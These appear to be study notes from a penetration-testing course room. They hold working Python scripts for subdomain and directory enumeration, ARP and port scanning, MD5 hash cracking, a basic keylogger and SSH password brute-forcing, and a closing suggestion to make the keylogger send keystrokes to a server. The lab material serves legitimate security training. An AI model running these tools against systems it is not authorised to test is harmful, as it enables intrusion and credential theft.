# Python For Pentesters

- ANy tasks that you perform regularly are worth automating

## Subdomain Enumeration
```
import requests 
import sys 

sub_list = open("subdomains.txt").read() 
subdoms = sub_list.splitlines()

for sub in subdoms:
    sub_domains = f"http://{sub}.{sys.argv[1]}" 

    try:
        requests.get(sub_domains)
    
    except requests.ConnectionError: 
        pass
    
    else:
        print("Valid domain: ",sub_domains)
```
- DNS can also be used for subdomain enumeration

## Directory Enumeration
```
import requests 
import sys 

sub_list = open("wordlist.txt").read() 
directories = sub_list.splitlines()

for dir in directories:
    dir_enum = f"http://{sys.argv[1]}/{dir}.html" 
    r = requests.get(dir_enum)
    if r.status_code==404: 
        pass
    else:
        print("Valid directory:", dir_enum)
```

## Network Scanner
- ICMP can be used to identify machines, but ICMP packets can be monitored or blocked, so ARP is more effective
```
from scapy.all import *

interface = "eth0"
ip_range = "10.10.X.X/24"
broadcastMac = "ff:ff:ff:ff:ff:ff"

packet = Ether(dst=broadcastMac)/ARP(pdst = ip_range) 

ans, unans = srp(packet, timeout =2, iface=interface, inter=0.1)

for send,receive in ans:
        print (receive.sprintf(r"%Ether.src% - %ARP.psrc%"))
```

## Port Scanner
```
import sys
import socket
import pyfiglet


ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \nPort Scanner")
print(ascii_banner)


ip = '192.168.1.6' 
open_ports =[] 

ports = range(1, 65535)


def probe_port(ip, port, result = 1): 
  try: 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sock.settimeout(0.5) 
    r = sock.connect_ex((ip, port))   
    if r == 0: 
      result = r 
    sock.close() 
  except Exception as e: 
    pass 
  return result


for port in ports: 
    sys.stdout.flush() 
    response = probe_port(ip, port) 
    if response == 0: 
        open_ports.append(port) 
    

if open_ports: 
  print ("Open Ports are: ") 
  print (sorted(open_ports)) 
else: 
  print ("Looks like no ports are open :(")
```

## File Downloader
```
import requests

url = 'https://assets.tryhackme.com/img/THMlogo.png'
r = requests.get(url, allow_redirects=True)
open('THMlogo.png', 'wb').write(r.content)
```
- ﻿﻿PSexec allow system administrators to run commands on remote Windows systems. We see that PSexec is also used in cyber attacks as it is usually not detected by antivirus software. You can learn more about PSexec [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) and read [this](https://www.praetorian.com/blog/threat-hunting-how-to-detect-psexec/) blogpost about its use by attackers.

## Hash Cracker
```
import hashlib
import pyfiglet

ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \n HASH CRACKER for MD 5")
print(ascii_banner)

wordlist_location = str(input('Enter wordlist file location: '))
hash_input = str(input('Enter hash to be cracked: '))

with open(wordlist_location, 'r') as file:
    for line in file.readlines():
        hash_ob = hashlib.md5(line.strip().encode())
        hashed_pass = hash_ob.hexdigest()
        if hashed_pass == hash_input:
            print('Found cleartext password! ' + line.strip())
            exit(0)
```

## Keylogger
```
import keyboard
keys = keyboard.record(until ='ENTER')
keyboard.play(keys)
```

## SSH Brute Forcing
```
import paramiko
import sys
import os

target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)

            if response == 0:
                 print('password found: '+ password)
                 exit(0)
            elif response == 1: 
                print('no luck')
        except Exception as e:
            print(e)
        pass

input_file.close()
```

## Extra Challenges
```
Based on what we have covered in this room, here are a few suggestions about how you could expand these tools or start building your own using Python:

Use DNS requests to enumerate potential subdomains
Build the keylogger to send the capture keystrokes to a server you built using Python
Grab the banner of services running on open ports
Crawl the target website to download .js library files included
Try to build a Windows executable for each and see if they work as stand-alone applications on a Windows target
Implement threading in enumeration and brute-forcing scripts to make them run faster
```
